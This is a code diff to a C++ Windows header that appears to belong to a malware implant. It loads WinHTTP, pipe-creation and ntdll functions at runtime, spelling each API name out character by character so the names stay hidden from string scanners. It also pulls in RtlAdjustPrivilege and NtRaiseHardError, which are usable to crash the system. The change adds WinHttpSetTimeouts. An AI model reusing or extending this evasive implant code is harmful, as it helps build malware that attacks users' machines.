@@ -7,7 +7,6 @@
 #include <winhttp.h>
 #include <winternl.h>
 
-
 typedef FARPROC(WINAPI* _GetProcAddress)(HMODULE, const char *);
 typedef HMODULE(WINAPI* _LoadLibraryA)(const char *);
 
@@ -86,6 +85,13 @@ typedef WINBOOL (WINAPI* _WinHttpSetOption) (
 	_In_reads_bytes_(dwBufferLength) LPVOID    lpBuffer,
 	_In_                             DWORD     dwBufferLength
 );
+typedef WINBOOL (WINAPI* _WinHttpSetTimeouts) (
+	_In_ HINTERNET,
+	_In_ int,
+	_In_ int,
+	_In_ int,
+	_In_ int
+);
 
 
 typedef WINBOOL (WINAPI* _CreatePipe) (
@@ -154,7 +160,7 @@ namespace Win32
 	static char STR_NTRAISEHARDERROR[17]          = {'N', 't', 'R', 'a', 'i', 's', 'e', 'H', 'a', 'r', 'd', 'E', 'r', 'r', 'o', 'r', '\0'};
 
 	// winhttp.dll
-	static char STR_WINHTTPOPEN[12] 		       = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', '\0'};
+	static char STR_WINHTTPOPEN[12] 		      = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', '\0'};
 	static char STR_WINHTTPCONNECT[15]            = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', '\0'};
 	static char STR_WINHTTPOPENREQUEST[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
 	static char STR_WINHTTPADDREQUESTHEADERS[25]  = {'W', 'i', 'n', 'H', 't', 't', 'p', 'A', 'd', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 'H', 'e', 'a', 'd', 'e', 'r', 's', '\0'};
@@ -166,6 +172,7 @@ namespace Win32
 	static char STR_WINHTTPREADDATA[16]           = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', '\0'};
 	static char STR_WINHTTPCLOSEHANDLE[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
 	static char STR_WINHTTPSETOPTION[17]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', '\0'};
+	static char STR_WINHTTPSETTIMEOUTS[]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'o', 'u', 't', 's', '\0'};
 
 	// kernel32.dll
 	static char STR_CREATEPIPE[]           = {'C', 'r', 'e', 'a', 't', 'e', 'P', 'i', 'p', 'e', '\0'};
@@ -219,6 +226,7 @@ namespace Win32
 	static _WinHttpReadData           WinHttpReadData           = (_WinHttpReadData)GetProcAddress(WinHttp, STR_WINHTTPREADDATA);
 	static _WinHttpCloseHandle        WinHttpCloseHandle        = (_WinHttpCloseHandle)GetProcAddress(WinHttp, STR_WINHTTPCLOSEHANDLE);
 	static _WinHttpSetOption          WinHttpSetOption          = (_WinHttpSetOption)GetProcAddress(WinHttp, STR_WINHTTPSETOPTION);
+	static _WinHttpSetTimeouts        WinHttpSetTimeouts        = (_WinHttpSetTimeouts)GetProcAddress(WinHttp, STR_WINHTTPSETTIMEOUTS);
 
 	static _RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(Ntdll, STR_RTLADJUSTPRIVILEGE);
 	static _NtRaiseHardError   NtRaiseHardError   = (_NtRaiseHardError)GetProcAddress(Ntdll, STR_NTRAISEHARDERROR);
